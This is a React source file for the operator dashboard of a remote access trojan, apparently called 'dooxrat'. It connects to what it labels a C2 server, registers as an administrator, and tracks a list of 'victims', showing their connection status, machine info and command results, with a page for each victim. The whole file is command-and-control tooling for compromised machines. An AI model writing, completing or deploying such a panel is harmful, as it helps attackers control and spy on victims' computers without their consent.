import React, { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
import io from 'socket.io-client';
import Login from './components/Login';
import Dashboard from './components/Dashboard';
import VictimDetail from './components/VictimDetail';
import './App.css';

const SERVER_URL = 'http://localhost:5000';

function App() {
  const [socket, setSocket] = useState(null);
  const [token, setToken] = useState(localStorage.getItem('dooxrat_token'));
  const [victims, setVictims] = useState([]);

  useEffect(() => {
    if (token) {
      const newSocket = io(SERVER_URL, {
        transports: ['websocket'],
        reconnection: true
      });

      newSocket.on('connect', () => {
        console.log('[SOCKET] Connected to C2 server');
        newSocket.emit('register_admin');
      });

      newSocket.on('victims_list', (list) => {
        setVictims(list);
      });

      newSocket.on('victim_connected', (data) => {
        setVictims(prev => {
          const exists = prev.find(v => v.id === data.id);
          if (exists) {
            return prev.map(v => v.id === data.id ? { ...v, status: 'online', info: data.info } : v);
          }
          return [...prev, { id: data.id, info: data.info, status: 'online', lastSeen: data.timestamp }];
        });
      });

      newSocket.on('victim_disconnected', (data) => {
        setVictims(prev => prev.map(v => v.id === data.id ? { ...v, status: 'offline' } : v));
      });

      newSocket.on('command_result', (data) => {
        console.log('[COMMAND_RESULT]', data);
      });

      setSocket(newSocket);

      return () => newSocket.close();
    }
  }, [token]);

  const handleLogin = (newToken) => {
    localStorage.setItem('dooxrat_token', newToken);
    setToken(newToken);
  };

  const handleLogout = () => {
    localStorage.removeItem('dooxrat_token');
    setToken(null);
    if (socket) socket.close();
  };

  if (!token) {
    return <Login onLogin={handleLogin} />;
  }

  return (
    <Router>
      <Routes>
        <Route path="/" element={<Dashboard victims={victims} socket={socket} onLogout={handleLogout} />} />
        <Route path="/victim/:id" element={<VictimDetail victims={victims} socket={socket} />} />
        <Route path="*" element={<Navigate to="/" />} />
      </Routes>
    </Router>
  );
}

export default App;
